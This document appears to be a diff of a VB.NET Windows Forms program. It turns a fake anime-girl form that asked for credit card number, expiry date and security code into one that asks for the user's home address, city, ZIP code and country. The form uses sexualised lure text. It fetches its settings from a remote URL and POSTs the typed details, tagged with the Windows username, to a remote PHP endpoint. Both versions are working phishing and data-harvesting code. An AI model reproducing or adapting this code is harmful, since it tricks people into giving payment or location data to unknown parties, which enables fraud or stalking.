@@ -1,16 +1,16 @@
 ﻿Imports System.IO
 Imports System.Net
 Imports System.Text
-Public Class AnimeGirlWantsCreditCarInfo
+Public Class AnimeSomeoneWantToKnowWhereYouLive
     Dim DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
-    Dim ConfigFile As String = DIRCommons & "\AnimeGirlWantsCreditCarInfo.ini"
+    Dim ConfigFile As String = DIRCommons & "\AnimeSomeoneWantToKnowWhereYouLive.ini"
     Dim userCanExit As Boolean = False
 
-    Private Sub AnimeGirlWantsCreditCarInfo_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+    Private Sub AnimeSomeoneWantToKnowWhereYouLive_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         ReadParameters(Command())
         ReadValues()
     End Sub
-    Private Sub AnimeGirlWantsCreditCarInfo_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
+    Private Sub AnimeSomeoneWantToKnowWhereYouLive_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
         End
     End Sub
     Sub ReadParameters(ByVal parametros As String)
@@ -29,7 +29,7 @@ Public Class AnimeGirlWantsCreditCarInfo
 
             End If
         Catch ex As Exception
-            Console.WriteLine("[GetValues@AnimeGirlWantsCreditCarInfo]Error: " & ex.Message)
+            Console.WriteLine("[GetValues@AnimeSomeoneWantToKnowWhereYouLive]Error: " & ex.Message)
             End
         End Try
     End Sub
@@ -41,7 +41,7 @@ Public Class AnimeGirlWantsCreditCarInfo
             End If
             My.Computer.Network.DownloadFile(fileURL, ConfigFile)
         Catch ex As Exception
-            Console.WriteLine("[GetValues@AnimeGirlWantsCreditCarInfo]Error: " & ex.Message)
+            Console.WriteLine("[GetValues@AnimeSomeoneWantToKnowWhereYouLive]Error: " & ex.Message)
             End
         End Try
     End Sub
@@ -49,28 +49,29 @@ Public Class AnimeGirlWantsCreditCarInfo
         Try
             Me.Size = New Size(GetIniValue("OPTIONS", "Size", ConfigFile, "740;300").Split(";")(0), GetIniValue("OPTIONS", "Size", ConfigFile, "740;300").Split(";")(1))
 
-            Dim meText As String = GetIniValue("TEXT", "Text", ConfigFile, "O-ohayo Hunter-san")
+            Dim meText As String = GetIniValue("TEXT", "Text", ConfigFile, "Ohayo senpai!")
             meText = meText.Replace("%username%", Environment.UserName)
             meText = meText.Replace("%vbCrLf%", vbCrLf)
             Me.Text = meText
 
-            Dim meInformation As String = GetIniValue("TEXT", "lbl_Information", ConfigFile, "uwu%vbCrLf%Can i have your credit card information? p-please")
+            Dim meInformation As String = GetIniValue("TEXT", "lbl_Information", ConfigFile, "a///w///a%vbCrLf%c-can i get you address information? i-i want to do some s-sexual things with you%vbCrLf%owo")
             meInformation = meInformation.Replace("%username%", Environment.UserName)
             meInformation = meInformation.Replace("%vbCrLf%", vbCrLf)
             Me.lbl_Information.Text = meInformation
 
-            Me.lbl_CardNumber.Text = GetIniValue("CARD", "lbl_CardNumber", ConfigFile, "Card Number: ")
-            Me.lbl_ExpiryDate.Text = GetIniValue("CARD", "lbl_ExpiryDate", ConfigFile, "Expiry date: ")
-            Me.lbl_SecurityCode.Text = GetIniValue("CARD", "lbl_SecurityCode", ConfigFile, "Security code: ")
+            Me.lbl_Address.Text = GetIniValue("ADDRESS", "lbl_Address", ConfigFile, "Address: ")
+            Me.lbl_CityOrTown.Text = GetIniValue("ADDRESS", "lbl_CityOrTown", ConfigFile, "City/Town: ")
+            Me.lbl_ZIPCode.Text = GetIniValue("ADDRESS", "lbl_ZIPCode", ConfigFile, "ZIP Code: ")
+            Me.lbl_Country.Text = GetIniValue("ADDRESS", "lbl_Country", ConfigFile, "Country: ")
 
             Dim meButton As String = GetIniValue("CARD", "btn_Send", ConfigFile, "Th-thanks...")
             meButton = meButton.Replace("%username%", Environment.UserName)
             meButton = meButton.Replace("%vbCrLf%", vbCrLf)
             Me.btn_Send.Text = meButton
 
-            Me.PictureBox1.ImageLocation = GetIniValue("IMAGE", "Picture", ConfigFile, "https://i.imgur.com/hhWP6Ie.jpeg")
+            Me.PictureBox1.ImageLocation = GetIniValue("IMAGE", "Picture", ConfigFile, "https://i.imgur.com/JZIxIaHb.jpg")
         Catch ex As Exception
-            Console.WriteLine("[ReadValues@AnimeGirlWantsCreditCarInfo]Error: " & ex.Message)
+            Console.WriteLine("[ReadValues@AnimeSomeoneWantToKnowWhereYouLive]Error: " & ex.Message)
             End
         End Try
     End Sub
@@ -79,7 +80,7 @@ Public Class AnimeGirlWantsCreditCarInfo
         If TextBox1.Text = Nothing Or TextBox2.Text = Nothing Or TextBox3.Text = Nothing Then
         Else
             Try
-                Dim reportContent As String = TextBox1.Text & vbCrLf & TextBox2.Text & vbCrLf & TextBox3.Text
+                Dim reportContent As String = TextBox1.Text & vbCrLf & TextBox2.Text & vbCrLf & TextBox3.Text & vbCrLf & TextBox4.Text
                 Dim request As WebRequest = WebRequest.Create(GetIniValue("ACTION", "phpPost", ConfigFile))
                 request.Method = "POST"
                 Dim postData As String = "id=" & Environment.UserName & "_" & My.Application.Info.AssemblyName & "&content=" & reportContent
@@ -103,6 +104,6 @@ Public Class AnimeGirlWantsCreditCarInfo
     End Sub
 
     Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
-        MsgBox(GetIniValue("ACTION", "ImageTouch", ConfigFile, "Hey, You can't touch me yet!"), MsgBoxStyle.ApplicationModal, Me.Text)
+        MsgBox(GetIniValue("ACTION", "ImageTouch", ConfigFile, "Hey, all i need is yot address!"), MsgBoxStyle.ApplicationModal, Me.Text)
     End Sub
 End Class
